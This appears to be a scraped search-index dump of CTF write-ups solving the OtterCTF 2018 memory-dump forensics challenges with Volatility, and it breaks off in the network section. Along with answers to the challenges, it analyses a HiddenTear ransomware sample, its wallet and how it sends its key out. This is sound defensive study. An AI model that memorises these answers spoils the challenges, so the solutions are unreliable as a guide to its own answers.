2836 BitTorrent.exe 2018-08-04 19:27:17 UTC+0000 0x7d62f920 UDPv4 192.168.202.131:62306 *:* 2836 BitTorrent.exe 2018-08-04 19:27:17 UTC+0000 0x7d6424c0 UDPv4 0.0.0.0:50762 *:* 4076 chrome.exe 2018-08-04 19:33:37 UTC+0000 0x7d6b4250 UDPv6 ::1:1900 *:* 164 svchost.exe 2018-08-04 19:28:42 UTC+0000 0x7d6e3230 UDPv4 127.0.0.1:6771 *:* 2836 BitTorrent.exe 2018-08-04 19:27:22 UTC+0000 0x7d6ed650 UDPv4 0.0.0.0:5355 *:* 620 svchost.exe 2018-08-04 19:34:22 UTC+0000 0x7d71c8a0 UDPv4 0.0.0.0:0 *:* 868 svchost.exe 2018-08-04 19:34:22 UTC+0000 0x7d71c8a0 UDPv6 :::0 *:* 868 svchost.exe 2018-08-04 19:34:22 UTC+0000 0x7d74a390 UDPv4 127.0.0.1:52847 *:* 2624 bittorrentie.e 2018-08-04 19:27:24 UTC+0000 0x7d7602c0 UDPv4 127.0.0.1:52846 *:* 2308 bittorrentie.e 2018-08-04 19:27:24 UTC+0000 [...] The most frequent source IP in the output is: 192.168.202.131. Good news, it’s the flag: CTF{192.168.202.131} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:2:2","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"3 - Play time Again, two flags to find. This time, let’s start to resolve the first flag: game name. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:3:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Game name If Rick plays to something, his process should run: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 pstree \u003e ppstree $ cat ppstree Name Pid PPid Thds Hnds Time -------------------------------------------------- ------ ------ ------ ------ ---- 0xfffffa801b27e060:explorer.exe 2728 2696 33 854 2018-08-04 19:27:04 UTC+0000 . 0xfffffa801b486b30:Rick And Morty 3820 2728 4 185 2018-08-04 19:32:55 UTC+0000 .. 0xfffffa801a4c5b30:vmware-tray.ex 3720 3820 8 147 2018-08-04 19:33:02 UTC+0000 . 0xfffffa801b2f02e0:WebCompanion.e 2844 2728 0 ------ 2018-08-04 19:27:07 UTC+0000 . 0xfffffa801a4e3870:chrome.exe 4076 2728 44 1160 2018-08-04 19:29:30 UTC+0000 .. 0xfffffa801a4eab30:chrome.exe 4084 4076 8 86 2018-08-04 19:29:30 UTC+0000 .. 0xfffffa801a5ef1f0:chrome.exe 1796 4076 15 170 2018-08-04 19:33:41 UTC+0000 .. 0xfffffa801aa00a90:chrome.exe 3924 4076 16 228 2018-08-04 19:29:51 UTC+0000 .. 0xfffffa801a635240:chrome.exe 3648 4076 16 207 2018-08-04 19:33:38 UTC+0000 .. 0xfffffa801a502b30:chrome.exe 576 4076 2 58 2018-08-04 19:29:31 UTC+0000 .. 0xfffffa801a4f7b30:chrome.exe 1808 4076 13 229 2018-08-04 19:29:32 UTC+0000 .. 0xfffffa801a7f98f0:chrome.exe 2748 4076 15 181 2018-08-04 19:31:15 UTC+0000 . 0xfffffa801b5cb740:LunarMS.exe 708 2728 18 346 2018-08-04 19:27:39 UTC+0000 . 0xfffffa801b1cdb30:vmtoolsd.exe 2804 2728 6 190 2018-08-04 19:27:06 UTC+0000 . 0xfffffa801b290b30:BitTorrent.exe 2836 2728 24 471 2018-08-04 19:27:07 UTC+0000 .. 0xfffffa801b4c9b30:bittorrentie.e 2624 2836 13 316 2018-08-04 19:27:21 UTC+0000 .. 0xfffffa801b4a7b30:bittorrentie.e 2308 2836 15 337 2018-08-04 19:27:19 UTC+0000 0xfffffa8018d44740:System 4 0 95 411 2018-08-04 19:26:03 UTC+0000 . 0xfffffa801947e4d0:smss.exe 260 4 2 30 2018-08-04 19:26:03 UTC+0000 0xfffffa801a2ed060:wininit.exe 396 336 3 78 2018-08-04 19:26:11 UTC+0000 . 0xfffffa801ab377c0:services.exe 492 396 11 242 2018-08-04 19:26:12 UTC+0000 .. 0xfffffa801afe7800:svchost.exe 1948 492 6 96 2018-08-04 19:26:42 UTC+0000 .. 0xfffffa801ae92920:vmtoolsd.exe 1428 492 9 313 2018-08-04 19:26:27 UTC+0000 ... 0xfffffa801a572b30:cmd.exe 3916 1428 0 ------ 2018-08-04 19:34:22 UTC+0000 .. 0xfffffa801ae0f630:VGAuthService. 1356 492 3 85 2018-08-04 19:26:25 UTC+0000 .. 0xfffffa801abbdb30:vmacthlp.exe 668 492 3 56 2018-08-04 19:26:16 UTC+0000 .. 0xfffffa801aad1060:Lavasoft.WCAss 3496 492 14 473 2018-08-04 19:33:49 UTC+0000 .. 0xfffffa801a6af9f0:svchost.exe 164 492 12 147 2018-08-04 19:28:42 UTC+0000 .. 0xfffffa801ac2e9e0:svchost.exe 808 492 22 508 2018-08-04 19:26:18 UTC+0000 ... 0xfffffa801ac753a0:audiodg.exe 960 808 7 151 2018-08-04 19:26:19 UTC+0000 .. 0xfffffa801ae7f630:dllhost.exe 1324 492 15 207 2018-08-04 19:26:42 UTC+0000 .. 0xfffffa801a6c2700:mscorsvw.exe 3124 492 7 77 2018-08-04 19:28:43 UTC+0000 .. 0xfffffa801b232060:sppsvc.exe 2500 492 4 149 2018-08-04 19:26:58 UTC+0000 .. 0xfffffa801abebb30:svchost.exe 712 492 8 301 2018-08-04 19:26:17 UTC+0000 .. 0xfffffa801ad718a0:svchost.exe 1164 492 18 312 2018-08-04 19:26:23 UTC+0000 .. 0xfffffa801ac31b30:svchost.exe 844 492 17 396 2018-08-04 19:26:18 UTC+0000 ... 0xfffffa801b1fab30:dwm.exe 2704 844 4 97 2018-08-04 19:27:04 UTC+0000 .. 0xfffffa801988c2d0:PresentationFo 724 492 6 148 2018-08-04 19:27:52 UTC+0000 .. 0xfffffa801b603610:mscorsvw.exe 412 492 7 86 2018-08-04 19:28:42 UTC+0000 .. 0xfffffa8018e3c890:svchost.exe 604 492 11 376 2018-08-04 19:26:16 UTC+0000 ... 0xfffffa8019124b30:WmiPrvSE.exe 1800 604 9 222 2018-08-04 19:26:39 UTC+0000 ... 0xfffffa801b112060:WmiPrvSE.exe 2136 604 12 324 2018-08-04 19:26:51 UTC+0000 .. 0xfffffa801ad5ab30:spoolsv.exe 1120 492 14 346 2018-08-04 19:26:22 UTC+0000 .. 0xfffffa801ac4db30:svchost.exe 868 492 45 1114 2018-08-04 19:26:18 UTC+0000 .. 0xfffffa801a6e4b30:svchost.exe 3196 492 14 352 2018-08-04 19:28:44 UTC+0000 .. 0xfffffa801acd37e0:svchost.exe 620 492 19 415 2018-08-04 19:26:21 UTC+0000 .. 0xfffffa801b1e9b30:taskhost.exe 2344 492 8 193 2018-08-04 19:26:57 UTC+0000 .. 0xfffffa801ac97060:svchost.exe ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:3:1","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Game IP Now I got the process name, find the associated IP will be easy. Indeed, netscan plugin used previously is also showing IP address associated to processes. $ cat pnetscan | grep LunarMS 0x7d6124d0 TCPv4 192.168.202.131:49530 77.102.199.102:7575 CLOSED 708 LunarMS.exe 0x7e413a40 TCPv4 -:0 -:0 CLOSED 708 LunarMS.exe 0x7e521b50 TCPv4 -:0 -:0 CLOSED 708 LunarMS.exe The only IP address comes out: CTF{77.102.199.102} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:3:2","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"4 - Name Game We know the game, then we know its PID. We got a string, I will use it as search index: Lunar-3. A volatility plugin that I like a lot is yarascan, it’s like a grep, but better for a memory dump. It’s possible to look for patterns with regular expression or just looking for standard strings. For this challenge, I will only look for standard strings in the game process: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 yarascan --yara-rules=\"Lunar-3\" -p 708 Volatility Foundation Volatility Framework 2.6.1 Rule: r1 Owner: Process LunarMS.exe Pid 708 0x5a0c1070 4c 75 6e 61 72 2d 33 00 00 7a 33 00 00 00 00 00 Lunar-3..z3..... 0x5a0c1080 00 1d 00 00 00 01 00 00 00 0b 00 00 00 0b 00 00 ................ 0x5a0c1090 00 30 74 74 33 72 38 72 33 33 7a 33 00 00 00 00 .0tt3r8r33z3.... 0x5a0c10a0 00 00 1d 00 00 00 01 00 00 00 0d 00 00 00 0d 00 ................ 0x5a0c10b0 00 00 53 6f 75 6e 64 2f 55 49 2e 69 6d 67 2f 00 ..Sound/UI.img/. 0x5a0c10c0 00 00 00 1d 00 00 00 01 00 00 00 0c 00 00 00 0c ................ 0x5a0c10d0 00 00 00 42 74 4d 6f 75 73 65 43 6c 69 63 6b 00 ...BtMouseClick. 0x5a0c10e0 00 00 00 00 1d 00 00 00 01 00 00 00 07 00 00 00 ................ 0x5a0c10f0 07 00 00 00 4c 75 6e 61 72 2d 34 00 00 00 00 00 ....Lunar-4..... 0x5a0c1100 00 00 00 00 00 1d 00 00 00 01 00 00 00 07 00 00 ................ 0x5a0c1110 00 07 00 00 00 4c 75 6e 61 72 2d 31 00 00 00 00 .....Lunar-1.... 0x5a0c1120 00 00 00 00 00 00 1d 00 00 00 01 00 00 00 07 00 ................ 0x5a0c1130 00 00 07 00 00 00 4c 75 6e 61 72 2d 32 00 00 7a ......Lunar-2..z 0x5a0c1140 00 00 00 00 00 00 00 1d 00 00 00 01 00 00 00 08 ................ 0x5a0c1150 00 00 00 08 00 00 00 53 63 72 6f 6c 6c 55 70 00 .......ScrollUp. 0x5a0c1160 00 00 00 00 00 00 00 00 1d 00 00 00 01 00 00 00 ................ The leet speak string looks like a flag ;) CTF{0tt3r8r33z3} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:4:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"5 - Name Game 2 In this case, I will use custom yara rules. The statement does not give strings, just a pattern: 0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} To find this pattern in memory, I just have to do a custom rule, here is my otterrule.yar file: rule OtterCTF { meta: desc = \"OtterCTF\" weight = 10 strings: $a = {?? [6-8] 40 06 [18] 5a 0c 00 00} condition: $a } Still filtering on the same PID, just add our rule file to the filter: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 yarascan -y usr_land/otterrule.ya -p 708 Volatility Foundation Volatility Framework 2.6.1 Rule: OtterCTF Owner: Process LunarMS.exe Pid 708 0x5ab4dfa7 08 44 64 00 00 00 00 00 00 40 06 00 00 b4 e5 af .Dd......@...... 0x5ab4dfb7 00 01 00 00 00 00 00 00 00 b0 e5 af 00 5a 0c 00 .............Z.. 0x5ab4dfc7 00 4d 30 72 74 79 4c 30 4c 00 00 00 00 00 00 00 .M0rtyL0L....... 0x5ab4dfd7 21 4e 00 00 55 75 00 00 00 00 00 00 00 00 00 00 !N..Uu.......... 0x5ab4dfe7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x5ab4dff7 b4 10 95 6f d5 cd 66 36 66 36 b4 ab ee fa a4 73 ...o..f6f6.....s 0x5ab4e007 9f 70 f2 ab 6e ba 3a c4 3f c4 3c ac ee 25 ac d9 .p..n.:.?.\u003c..%.. 0x5ab4e017 a8 d9 60 ac 6e a0 d6 25 d2 25 a8 ab ee ee e1 aa ..`.n..%.%...... 0x5ab4e027 d2 a2 29 ac 2e 9b d1 5e f4 57 d8 ab 2e 27 86 01 ..)....^.W...'.. 0x5ab4e037 7c 07 87 ab ee 0a e8 5f 12 59 d7 ab 6e 31 96 49 |......_.Y..n1.I 0x5ab4e047 96 49 cb ab ee 9e dd e6 dd e6 6a ac 2e 2c 12 bd .I........j..,.. 0x5ab4e057 3e 25 1f 03 6d 29 87 9d 69 26 f8 4a f8 4a cb ab \u003e%..m)..i\u0026.J.J.. 0x5ab4e067 6e ad 60 35 ef a2 01 c2 38 65 2c d8 fa cd e4 f8 n.`5....8e,..... 0x5ab4e077 90 31 c7 87 8c 21 0e 70 e6 6d 78 20 af 00 00 00 .1...!.p.mx..... 0x5ab4e087 00 00 00 00 00 00 00 00 00 00 00 00 00 00 5e 81 ..............^. 0x5ab4e097 ee 8f 7c 6a 4e 74 06 86 f8 0d 06 00 00 00 00 00 ..|jNt.......... [...] Great, it works well! CTF{M0rtyL0L} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:5:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"6 - Silly Rick This challenge will use a standard volatility plugin: clipboard. This plugin will get the clipboard content at dump time: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 clipboard Volatility Foundation Volatility Framework 2.6.1 Session WindowStation Format Handle Object Data ---------- ------------- ------------------ ------------------ ------------------ -------------------------------------------------- 1 WinSta0 CF_UNICODETEXT 0x602e3 0xfffff900c1ad93f0 M@il_Pr0vid0rs 1 WinSta0 CF_TEXT 0x10 ------------------ 1 WinSta0 0x150133L 0x200000000000 ------------------ 1 WinSta0 CF_TEXT 0x1 ------------------ 1 ------------- ------------------ 0x150133 0xfffff900c1c1adc0 EZ Win :D CTF{M@il_Pr0vid0rs} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:6:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"7 - Hide and Seek It’s starting to get interesting: malware. For this challenge, it’s better not to go wrong. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:7:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"A needle in a haystack If we get processes tree, we can notify some strange things: A “Rick and Morty” process, that has a child process ; Lavasoft process ; BitTorrent processes ; WebCompanion ; Notepad.exe which hasn’t got parent process. Remember, a malware can have any name. It’s better to look at the parents/child processes. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:7:1","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Malware, is that you? I’m going to start with my first hypothesis: the Rick and Morty process and his child, vmware-tray.exe. The first step, extract binaries: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3820 -D . Volatility Foundation Volatility Framework 2.6.1 Process(V) ImageBase Name Result ------------------ ------------------ -------------------- ------ 0xfffffa801b486b30 0x0000000000400000 Rick And Morty OK: executable.3820.exe $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 procdump -p 3720 -D . Volatility Foundation Volatility Framework 2.6.1 Process(V) ImageBase Name Result ------------------ ------------------ -------------------- ------ 0xfffffa801a4c5b30 0x0000000000ec0000 vmware-tray.ex OK: executable.3720.exe $ mv executable.3820.exe rickandmorty.exe $ mv executable.3720.exe vmware-tray.exe Now a little visit on virustotal, to see the score of those two rogues. First, rickandmorty.exe: Well, 4/68 it’s not really huge, probably a false positive. What Virustotal says about vmware-tray.exe: Great! Better results! It smells the malware :D And it is: CTF{vmware-tray.exe} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:7:2","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"8 - Path to glory According to running processes, I suppose the awful habits of Rick, are the illegal downloads on BitTorrent Let’s try to find what he downloaded: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 filescan \u003e pfilescan $ cat pfilescan | grep -i torrent [...] 0x000000007d63dbc0 10 0 R--r-d \\Device\\HarddiskVolume1\\Torrents\\Rick And Morty season 1 download.exe 0x000000007d8813c0 2 0 RW-rwd \\Device\\HarddiskVolume1\\Users\\Rick\\Downloads\\Rick And Morty season 1 download.exe.torrent 0x000000007da56240 2 0 RW-rwd \\Device\\HarddiskVolume1\\Torrents\\Rick And Morty season 1 download.exe 0x000000007dae9350 2 0 RWD--- \\Device\\HarddiskVolume1\\Users\\Rick\\AppData\\Roaming\\BitTorrent\\Rick And Morty season 1 download.exe.1.torrent 0x000000007dcbf6f0 2 0 RW-rwd \\Device\\HarddiskVolume1\\Users\\Rick\\AppData\\Roaming\\BitTorrent\\Rick And Morty season 1 download.exe.1.torrent 0x000000007e710070 8 0 R--rwd \\Device\\HarddiskVolume1\\Torrents\\Rick And Morty season 1 download.exe [...] There is a bunch of suspicious files. I first tried to extract Rick And Morty season 1 download.exe file but nothing really relevant inside for our problem: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007e710070 -D . Volatility Foundation Volatility Framework 2.6.1 ImageSectionObject 0x7e710070 None \\Device\\HarddiskVolume1\\Torrents\\Rick And Morty season 1 download.exe DataSectionObject 0x7e710070 None \\Device\\HarddiskVolume1\\Torrents\\Rick And Morty season 1 download.exe Let’s do the same operation on the torrent file: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007dae9350 -D . Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x7dae9350 None \\Device\\HarddiskVolume1\\Users\\Rick\\AppData\\Roaming\\BitTorrent\\Rick And Morty season 1 download.exe.1.torrent $ strings file.None.0xfffffa801b42c9e0.dat d8:announce44:udp://tracker.openbittorrent.com:80/announce13:announce-listll44:udp://tracker.openbittorrent.com:80/announceel42:udp://tracker.opentrackr.org:1337/announceee10:created by17:BitTorrent/7.10.313:creation datei1533150595e8:encoding5:UTF-84:infod6:lengthi456670e4:name36:Rick And Morty season 1 download.exe12:piece lengthi16384e6:pieces560:\\I !PC\u003c^X B.k_Rk 0\u003c;O87o !4^\" 3hq, \u0026iW1| K68:o w~Q~YT $$o9p bwF:u e7:website19:M3an_T0rren7_4_R!cke Yay, it works! CTF{M3an_T0rren7_4_R!ck} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:8:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"9 - Path to glory 2 Honestly, with a good friend, we just guessed this flag, it’s insane. He sent me this message: “Hey bro, try to find the string ‘Th3’ inside memory!” Ok, but we can add more filter to be more efficient. The torrent file doesn’t come by a magic trick. Rick downloaded it with his favorite browser: Chrome. Then I search the string “Th3” into Chrome processes: $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 yarascan --yara-rules=\"Th3\" -p 3924 [...] Volatility Foundation Volatility Framework 2.6.1 Rule: r1 Owner: Process chrome.exe Pid 3924 0x6203ba714dd 5f 54 68 33 5f 57 65 61 6b 33 73 37 5f 4c 69 6e _Th3_Weak3s7_Lin 0x6203ba714ed 6b 5f 49 6e 5f 54 68 33 5f 43 68 40 69 6e 59 65 k_In_Th3_Ch@inYe 0x6203ba714fd 61 72 00 00 00 06 20 3b a7 0f 50 51 46 e2 0d 2f ar.....;..PQF../ 0x6203ba7150d 2f 73 65 63 2d 73 2e 75 69 63 64 6e 2e 63 6f 6d /sec-s.uicdn.com 0x6203ba7151d 2f 6e 61 76 2d 63 64 6e 2f 68 6f 6d 65 2f 70 72 /nav-cdn/home/pr 0x6203ba7152d 65 6c 6f 61 64 65 72 2e 67 69 66 00 00 06 20 3b eloader.gif....; 0x6203ba7153d a7 16 18 00 00 00 02 6e 00 61 00 76 00 69 00 67 .......n.a.v.i.g 0x6203ba7154d 00 61 00 74 00 6f 00 72 00 2d 00 6c 00 78 00 61 .a.t.o.r.-.l.x.a 0x6203ba7155d 00 2e 00 6d 00 61 00 69 00 6c 00 2e 00 63 00 6f ...m.a.i.l...c.o 0x6203ba7156d 00 6d 00 01 00 00 00 16 00 00 00 00 00 00 62 6e .m............bn 0x6203ba7157d 00 61 00 76 00 69 00 67 00 61 00 74 00 6f 00 72 .a.v.i.g.a.t.o.r 0x6203ba7158d 00 2d 00 6c 00 78 00 61 00 2e 00 6d 00 61 00 69 .-.l.x.a...m.a.i 0x6203ba7159d 00 6c 00 2e 00 63 00 6f 00 6d 00 04 00 00 00 2a .l...c.o.m.....* 0x6203ba715ad 00 00 00 4f ac c4 0e 73 69 6d 70 6c 65 2d 69 63 ...O...simple-ic 0x6203ba715bd 6f 6e 5f 74 6f 6f 6c 62 61 72 2d 63 68 61 6e 67 on_toolbar-chang 0x6203ba715cd 65 2d 76 69 65 77 2d 68 6f 72 69 7a 6f 6e 74 61 e-view-horizonta [...] Ok, I got a piece of something, maybe of the flag: _Th3_Weak3s7_Link_In_Th3_Ch@inYear Let’s extract memory from process 3924 and see what happens. To look into memory dump, I’m using a good old strings and grep / less command. $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 memdump -p 3924 -D . Volatility Foundation Volatility Framework 2.6.1 ************************************************************************ Writing chrome.exe [ 3924] to 3924.dmp $ strings 3924.dmp| grep Weak3s7_Link_In Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@inYear [...] And the flag is: CTF{Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@in} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:9:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"10 - Bit 4 Bit If all scenario steps are followed, finding the wallet will be easy. The malware is known: vmware-tray.exe. We suspect that the wallet is embedded in the malicious binary: $ strings -e l vmware-tray.exe [...] label2 Your Payment has failed, The funs have been sent back to your wallet. Please send it again Error 1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M Send 0.16 to the address below. I paid, Now give me back my files. Form3 hidden_tear.Properties.Resources Bitcoin_Accepted_Here-4800px [...] The flag is: CTF{1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:10:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"11 - Graphic’s for the Weak Like the previous challenge, we already identified the malware. So if the malware deal with a picture, there are two possibilities: The picture is embedded in the malware The malware will download the picture There is an easy way to check the first hypothesis, use a carving software like binwalk, foremost or whatever. $ binwalk vmware-tray.exe DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Microsoft executable, portable (PE) 9178 0x23DA Copyright string: \"CopyrightAttribute\" 116288 0x1C640 PNG image, 4800 x 1454, 8-bit/color RGBA, non-interlaced 116416 0x1C6C0 Zlib compressed data, compressed 344098 0x54022 PNG image, 800 x 600, 8-bit colormap, non-interlaced 344511 0x541BF Zlib compressed data, best compression 420575 0x66ADF XML document, version: \"1.0\" 423178 0x6750A Unix path: /schemas.microsoft.com/SMI/2005/WindowsSettings\"\u003etrue\u003c/dpiAware\u003e We can see two PNG files, let’s try to extract them with foremost. I’m using foremost instead of binwalk to extract data because files extracted by foremost are much cleaner: $ foremost vmware-tray.exe Processing: vmware-tray.exe |*| $ file output/png/00000672.png output/png/00000672.png: PNG image data, 800 x 600, 8-bit colormap, non-interlaced CTF{S0_Just_M0v3_Socy} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:11:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"12 - Recovery I didn’t manage to solve those two last challenges during the CTF time. But there are very interesting, I had a lot of fun solving them. To find the encryption key, I have to reverse the malware. I want to find out how the key is generated and how the key is sent to the command and control server. Fortunately, the malware was developed with .NET language: $ file vmware-tray.exe vmware-tray.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows .NET languages can be decompiled easily with tools like ILSPy. The less I’m seeing assembly better I am! :D I quickly identified the function SendPassword. Now that I’ve been achieving to find how the key is sent, I can search the pattern in the memory dump: $ strings -e l OtterCTF.vmem| grep \"WIN-LO6FAF3DTFE-Rick \" WIN-LO6FAF3DTFE-Rick aDOBofVYUNVnmp7 CTF{aDOBofVYUNVnmp7} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:12:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"13 - Closure While I was looking for the method that sent the key to the command and control server, I saw a name that caught my attention: HiddenTears. HiddenTears is ransomware available on GitHub since 2015. Some little jerks use this GitHub to do new strains. But it means HiddenTears decrypter is available on the internet, even on the GitHub. Decrypter: https://github.com/goliate/hidden-tear/tree/master/hidden-tear-decrypter Firstly, get the file which contains the flag: $ cat pfilescan | grep -i flag 0x000000007d61b070 16 0 RW-rw- \\Device\\HarddiskVolume1\\Users\\Rick\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Flag.txt.WINDOWS.lnk 0x000000007e410890 16 0 R--r-- \\Device\\HarddiskVolume1\\Users\\Rick\\Desktop\\Flag.txt $ vol.py --plugins=plug_vol/ -f usr_land/OtterCTF.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -D . Volatility Foundation Volatility Framework 2.6.1 DataSectionObject 0x7e410890 None \\Device\\HarddiskVolume1\\Users\\Rick\\Desktop\\Flag.txt So, now we got a decryption key, an encrypted file, and a decrypter. It sounds good ;) … Or not, there is a little problem in the “Flag.txt” file that has been extracted: $ hexdump -C Flag.txt 00000000 7b e6 24 56 9e 5c 0f ef 8e 43 28 f7 e4 c5 83 ff |{.$V.\\...C(.....| 00000010 6c 31 d7 e6 1c da ea 54 cf 72 dd d6 ec 7e b0 7b |l1.....T.r...~.{| 00000020 c6 8d d0 a8 cc c2 ce 6e 3e ee 03 47 c1 0b b3 e8 |.......n\u003e..G....| 00000030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| * 00001000 There is a little mistake about padding, is there a bunch of zero at the end of the file. It probably happens during file extraction from memory. When the file is lightened of its 0 and renamed with ‘.locked’ extension, it’s decryption time: CTF{Im_Th@_B3S7_RicK_0f_Th3m_4ll} ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018memorydump/:13:0","tags":["otterctf","forensic","memory","volatility","yara"],"title":"[OtterCTF] - Memory dump","uri":"maki.bzh/writeups/otterctf2018memorydump/"},{"categories":["Writeups"],"content":"Network There are 4 network challenges during this CTF, I only solved 3 of them, here is how. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:0:0","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"Birdman’s Data ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:1:0","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"State of the art The PCAP file is not really big, I decided to open it using Wireshark. There are few things to notice: Data in UDP protocol HTTP packets to txtwizard.net There nothing interesting in UDP traffic, data does not represent much. On the other hand, HTTP traffic is very interesting. ","date":"2018-12-24","objectID":"maki.bzh/writeups/otterctf2018network/:1:1","tags":["otterctf","forensic","pcap","cryptography","aes","usb","smbv2","wireshark"],"title":"[OtterCTF] - Network","uri":"maki.bzh/writeups/otterctf2018network/"},{"categories":["Writeups"],"content":"“Crypto” time There is an interesting request: POST /crypto/AES/encrypt/CBC/PKCS5 HTTP/1.1 Host: www.txtwizard.net Connection: keep-alive Content-Length: 4297 Accept: application/json, text/javascript, */*; q=0.01 Origin: http://www.txtwizard.net Oh, AES CBC! We’re missing the encrypted data, key and IV… Just scroll a little bit ;) After URL decoding data, I got the key and IV, at the end we got: Key: XfCtxvD1yFZbxQ/+ULhAcA== IV : sEhrZxQpnNnINixu3KQ1Tg== Cipher text: 